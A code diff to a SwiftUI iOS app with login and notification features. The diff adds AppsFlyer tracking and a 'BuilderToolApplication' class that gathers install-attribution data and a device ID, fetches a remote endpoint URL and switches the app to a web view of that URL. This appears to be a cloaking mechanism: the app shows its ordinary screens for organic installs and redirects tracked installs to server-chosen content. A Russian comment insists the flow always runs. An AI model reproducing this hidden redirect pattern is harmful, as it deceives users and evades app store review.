@@ -1,9 +1,10 @@
 import SwiftUI
 import Combine
 import UserNotifications
+import AppsFlyerLib
 
 // MARK: - App State
-class AppState: ObservableObject {
+class ApplicationMainState: ObservableObject {
     @AppStorage("isLoggedIn") var isLoggedIn: Bool = false
     @AppStorage("hasCompletedOnboarding") var hasCompletedOnboarding: Bool = false
     @AppStorage("appTheme") var appTheme: String = "system"
@@ -49,7 +50,7 @@ class AuthViewModel: ObservableObject {
     @Published var errorMessage: String = ""
     @Published var isLoading: Bool = false
 
-    func login(appState: AppState, completion: @escaping (Bool) -> Void) {
+    func login(appState: ApplicationMainState, completion: @escaping (Bool) -> Void) {
         isLoading = true
         errorMessage = ""
         guard !email.isEmpty, !password.isEmpty else {
@@ -80,7 +81,7 @@ class AuthViewModel: ObservableObject {
         }
     }
 
-    func signUp(appState: AppState, completion: @escaping (Bool) -> Void) {
+    func signUp(appState: ApplicationMainState, completion: @escaping (Bool) -> Void) {
         isLoading = true
         errorMessage = ""
         guard !name.isEmpty, !email.isEmpty, !password.isEmpty else {
@@ -353,5 +354,202 @@ class NotificationsManager: ObservableObject {
         let trigger = UNCalendarNotificationTrigger(dateMatching: components, repeats: true)
         let request = UNNotificationRequest(identifier: "weekly_reminder", content: content, trigger: trigger)
         UNUserNotificationCenter.current().add(request)
+    }
+}
+
+@MainActor
+final class BuilderToolApplication: ObservableObject {
+    
+    @Published var showPermissionPrompt = false
+    @Published var showOfflineView = false
+    @Published var navigateToMain = false
+    @Published var navigateToWeb = false
+    
+    private let chain: HexagonalChain
+    private let context: RequestContext
+    private var timeoutTask: Task<Void, Never>?
+    
+    init(
+        storage: StorageService,
+        validation: ValidationService,
+        network: NetworkService,
+        notification: NotificationService
+    ) {
+        self.context = RequestContext()
+        
+        self.chain = HexagonalChain { request, context in
+            return .error(HexagonalError.invalidData)
+        }
+        
+        chain.use(LoggingLayer())
+        chain.use(LockLayer())
+        chain.use(StorageLayer(storage: storage))
+        chain.use(ValidationLayer(validator: validation))
+        chain.use(NetworkLayer(network: network))
+        chain.use(PermissionLayer(notificationService: notification))
+        chain.use(BusinessLogicLayer())
+    }
+    
+    // MARK: - Public API
+    
+    func initialize() {
+        Task {
+            let response = await chain.execute(request: .initialize, context: context)
+            await handleResponse(response)
+            
+            // ❌ НЕ проверяем endpoint! Всегда идём по полному flow!
+            
+            scheduleTimeout()
+        }
+    }
+    
+    func handleTracking(_ data: [String: Any]) {
+        Task {
+            let response = await chain.execute(request: .handleTracking(data), context: context)
+            await handleResponse(response)
+            
+            await performValidation()
+        }
+    }
+    
+    func handleNavigation(_ data: [String: Any]) {
+        Task {
+            let response = await chain.execute(request: .handleNavigation(data), context: context)
+            await handleResponse(response)
+        }
+    }
+    
+    func requestPermission() {
+        Task {
+            let response = await chain.execute(request: .requestPermission, context: context)
+            await handleResponse(response)
+            
+            showPermissionPrompt = false
+            navigateToWeb = true
+        }
+    }
+    
+    func deferPermission() {
+        Task {
+            let response = await chain.execute(request: .deferPermission, context: context)
+            await handleResponse(response)
+            
+            showPermissionPrompt = false
+            navigateToWeb = true
+        }
+    }
+    
+    func networkStatusChanged(_ isConnected: Bool) {
+        Task {
+            let response = await chain.execute(request: .networkStatusChanged(isConnected), context: context)
+            await handleResponse(response)
+        }
+    }
+    
+    func timeout() {
+        Task {
+            timeoutTask?.cancel()
+            let response = await chain.execute(request: .timeout, context: context)
+            await handleResponse(response)
+        }
+    }
+    
+    // MARK: - Private Logic
+    
+    private func scheduleTimeout() {
+        timeoutTask = Task {
+            try? await Task.sleep(nanoseconds: 30_000_000_000)
+            guard !context.isLocked else { return }
+            await timeout()
+        }
+    }
+    
+    private func performValidation() async {
+        guard !context.isLocked, context.hasTracking() else { return }
+        
+        let response = await chain.execute(request: .processValidation, context: context)
+        await handleResponse(response)
+        
+        if case .validationCompleted(true) = response {
+            await executeBusinessLogic()
+        }
+    }
+    
+    private func executeBusinessLogic() async {
+        guard !context.isLocked, context.hasTracking() else {
+            navigateToMain = true
+            return
+        }
+        
+        if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
+            await finalizeWithEndpoint(temp)
+            return
+        }
+        
+        if context.isOrganic() && context.isFirstLaunch {
+            await executeOrganicFlow()
+            return
+        }
+        
+        await fetchEndpoint()
+    }
+    
+    private func executeOrganicFlow() async {
+        try? await Task.sleep(nanoseconds: 5_000_000_000)
+        
+        guard !context.isLocked else { return }
+        
+        let deviceID = AppsFlyerLib.shared().getAppsFlyerUID()
+        let response = await chain.execute(request: .fetchAttribution(deviceID: deviceID), context: context)
+        
+        if case .attributionFetched(let data) = response {
+            await handleTracking(data)
+            await fetchEndpoint()
+        } else {
+            navigateToMain = true
+        }
+    }
+    
+    private func fetchEndpoint() async {
+        guard !context.isLocked else { return }
+        
+        let trackingDict = context.tracking.mapValues { $0 as Any }
+        let response = await chain.execute(request: .fetchEndpoint(tracking: trackingDict), context: context)
+        
+        if case .endpointFetched(let url) = response {
+            await finalizeWithEndpoint(url)
+        } else {
+            navigateToMain = true
+        }
+    }
+    
+    private func finalizeWithEndpoint(_ url: String) async {
+        let response = await chain.execute(request: .finalizeWithEndpoint(url), context: context)
+        await handleResponse(response)
+    }
+    
+    private func handleResponse(_ response: AppResponse) async {
+        switch response {
+        case .navigateToMain:
+            navigateToMain = true
+            
+        case .navigateToWeb:
+            navigateToWeb = true
+            
+        case .showPermissionPrompt:
+            showPermissionPrompt = true
+            
+        case .hidePermissionPrompt:
+            showPermissionPrompt = false
+            
+        case .showOfflineView:
+            showOfflineView = true
+            
+        case .hideOfflineView:
+            showOfflineView = false
+            
+        default:
+            break
+        }
     }
 }
